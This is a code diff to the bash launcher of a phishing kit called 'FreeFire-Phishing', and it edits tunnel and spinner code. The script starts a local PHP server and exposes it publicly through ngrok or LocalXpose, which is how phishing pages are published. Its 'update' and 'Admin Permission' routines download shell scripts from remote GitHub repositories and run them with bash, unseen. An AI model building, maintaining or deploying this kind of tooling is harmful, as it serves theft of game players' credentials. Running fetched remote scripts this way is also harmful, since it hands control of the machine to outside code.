@@ -22,7 +22,6 @@ echo ""
 			   echo ""
 			   (sleep 4) &> /dev/null & spin_2
 			   echo ""
-			   tput civis
 			   ( sleep 8 ) &> /dev/null & spinner_1
                            echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -481,14 +480,12 @@ start_ngrok() {
 	{ sleep 1; }
 	echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok...\e[0m  "
 	echo -e "\n"
-	read -n1 -p $'\e[91m[\e[92m*\e[91m]\e[95m Change Ngrok Server Region? \e[92m(y/N) \e[0m ' opinion
-	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
 	echo -e ""
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./ngrok http --region ${ngrok_region} 127.0.0.1:4444 > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
 	else
-		sleep 2 && ./ngrok http --region ${ngrok_region} 127.0.0.1:4444 > /dev/null 2>&1 &
+		sleep 2 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
 	fi
 
 	sleep 8
@@ -504,14 +501,12 @@ echo -e ""
 	echo -e "\e[91m[\e[0m-\e[91m]\e[1;92m Launching LocalXpose...\e[0m "
 	{ sleep 1; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p $'\e[91m[\e[92m*\e[91m]\e[95m Change Loclx Server Region? \e[92m(y/N) \e[0m ' opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e ""
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
+		sleep 1 && termux-chroot ./loclx tunnel --raw-mode http --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
 	else
-		sleep 1 && ./loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
+		sleep 1 && ./loclx tunnel --raw-mode http --https-redirect -t 127.0.0.1:4444 > .loclx 2>&1 &
 	fi
 
 	sleep 12
@@ -906,7 +901,7 @@ local delay=0.05
 local spinstr='|/-\'
 while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 local temp=${spinstr#?}
-tput civis
+tput
 printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Online Hacking Server Connecting... \e[96m[\e[1;92m%c\e[1;93m\e[96m]\e[0m  " "$spinstr"
 local spinstr=$temp${spinstr%"$temp"}
 sleep $delay
@@ -925,14 +920,14 @@ local delay=0.05
 local spinstr='|/-\'
 while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 local temp=${spinstr#?}
-civis
+tput
 printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[96m[\e[1;92m%c\e[1;93m\e[96m]\e[0m  " "$spinstr"
 local spinstr=$temp${spinstr%"$temp"}
 sleep $delay
 printf "\b\b\b\b\b\b"
 done
 printf "   \b\b\b"
-cnorm
+tput cnorm
 printf "\e[1;96m [\e[1;92m Online ● \e[1;96m]\e[0m"
 echo
 }
@@ -947,7 +942,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 
 for i in "${spinner[@]}"
 do
-	civis
+	
 	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;96m PHP Server Now Startng ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
@@ -969,7 +964,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 
 for i in "${spinner[@]}"
 do
-	civis
+	
 	echo -ne "\033[1;91m\r[\e[1;92m-\e[1;91m]\e[1;95m Start LocalHost...   \e[97m http://127.0.0.1:4444 \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
@@ -991,7 +986,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 
 for i in "${spinner[@]}"
 do
-	civis
+	
 	echo -ne "\033[1;91m\r[\e[1;95m-\e[1;91m]\e[1;92m Launching Link Service ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
@@ -1005,11 +1000,11 @@ echo "";
 
 check_update () {
 echo ""
-echo -ne "\e[33m Chack Lates Version : " && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
+echo -ne "\e[33m Chack Lates Version : " && rm -rf ChackVersion-2.8 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
 echo ""
-echo -ne "\e[33m Checking Update : " && sleep 1 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/CheckingUpdate-2.8 > /dev/null && bash CheckingUpdate-2.8 && rm -rf CheckingUpdate-2.8
+echo -ne "\e[33m Checking Update : " && rm -rf CheckingUpdate-2.8 && sleep 1 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/CheckingUpdate-2.8 > /dev/null && bash CheckingUpdate-2.8 && rm -rf CheckingUpdate-2.8
 echo ""
-echo -ne "\e[33m Admin Permission : " && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
+echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
 echo ""
 sleep 1
 }
